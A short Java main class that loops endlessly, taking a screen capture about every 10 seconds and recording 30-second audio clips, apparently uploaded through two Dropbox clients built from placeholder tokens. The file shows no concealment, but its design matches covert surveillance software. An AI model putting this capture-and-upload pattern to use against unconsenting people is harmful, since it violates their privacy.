import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;

public class Main {
    public static void main(String[] args) {
        String ACCESS_TOKEN_SOUND = "blablabla";
        String ACCESS_TOKEN_SCREEN = "blablabla,heh";


        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        long startTime = System.currentTimeMillis();
        int counter1,counter2;
        counter1 = counter2 = 0;
        DbxClientV2 client1 = new DbxClientV2(config, ACCESS_TOKEN_SOUND);
        DbxClientV2 client2 = new DbxClientV2(config, ACCESS_TOKEN_SCREEN);
        long time = 0;
        while (true) {
            JavaSoundRecorder recorder = new JavaSoundRecorder(client1, 30000);
            Screen thread = new Screen(client2);
            if(time == 0){
                thread.start();
                recorder.recordAudio();
            }
            time = System.currentTimeMillis() - startTime;
            if(time - (10000*counter1) >= 10000){
                thread.start();
                counter1++;
            }
            if(time - (30700*counter2) >= 30700){
                recorder.recordAudio();
                counter2++;
            }
        }
    }
}